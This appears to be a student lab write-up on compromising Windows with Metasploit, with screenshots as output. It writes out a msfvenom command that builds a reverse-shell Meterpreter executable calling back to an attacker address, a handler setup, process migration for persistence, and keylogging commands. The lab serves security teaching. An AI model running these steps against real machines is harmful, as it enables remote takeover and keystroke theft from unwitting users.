
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig

## OUTPUT:

<img width="1920" height="1043" alt="6(1)" src="https://github.com/user-attachments/assets/ee33cb31-2cea-4dd9-a1de-665f3be8f989" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

<img width="1920" height="1043" alt="6(2)" src="https://github.com/user-attachments/assets/f6ac94da-f35a-4dd7-83ed-002d63e0b59d" />

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:

<img width="1920" height="1043" alt="6(3)" src="https://github.com/user-attachments/assets/d7d4ea08-7688-4c5d-a61d-b89bdb3684ef" />

Start apache server
sudo systemctl apache2 start

## OUTPUT:
<img width="1920" height="1043" alt="6(3)" src="https://github.com/user-attachments/assets/d7d4ea08-7688-4c5d-a61d-b89bdb3684ef" />

Check the status of apache2

## OUTPUT:

<img width="1920" height="1043" alt="6(4)" src="https://github.com/user-attachments/assets/b3b1c4f2-b2fc-40ce-8fce-e84c0e001061" />


Invoke msfconsole:

## OUTPUT:

<img width="1920" height="1043" alt="6(5)" src="https://github.com/user-attachments/assets/973418de-a79f-498e-9e98-85b531856932" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:

<img width="1920" height="1043" alt="6(6)" src="https://github.com/user-attachments/assets/90a59754-3550-4a82-8d40-eaf7d6de1bdb" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="1920" height="1043" alt="6(7)" src="https://github.com/user-attachments/assets/7a761058-2fc8-436c-9e4d-d0e4317d39fb" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
On kali/parrot give the command exploit

## OUTPUT:

<img width="1920" height="204" alt="6(7)" src="https://github.com/user-attachments/assets/780dfccd-d4c7-4fd8-81ff-be5d2ac6aaa5" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:

<img width="1920" height="1043" alt="6(8)" src="https://github.com/user-attachments/assets/3057005c-ceeb-4a8e-b2a8-38612ca15240" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

## OUTPUT:
<img width="1920" height="165" alt="6(8)1" src="https://github.com/user-attachments/assets/57fb578f-0a6d-47f0-a2c3-497c6dcef6cf" />


at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
<img width="1920" height="890" alt="6(8)2" src="https://github.com/user-attachments/assets/180eb9f9-c89b-4648-bcf4-7c92a2761a52" />


<img width="1920" height="1043" alt="6(8)" src="https://github.com/user-attachments/assets/056811d9-a8d7-4ea6-9e7c-2742d30e7291" />

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:

<img width="1920" height="207" alt="6(9)1" src="https://github.com/user-attachments/assets/0d435b5b-a289-4dd4-ad9f-b7b6061d00c8" />

<img width="1920" height="1043" alt="Screenshot (2)" src="https://github.com/user-attachments/assets/5e0dcd60-bf3a-4e91-94a6-7e515a255897" />


keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:

<img width="1920" height="165" alt="6(9)2" src="https://github.com/user-attachments/assets/023ae1e3-eb89-4b39-b251-bad926b1151a" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
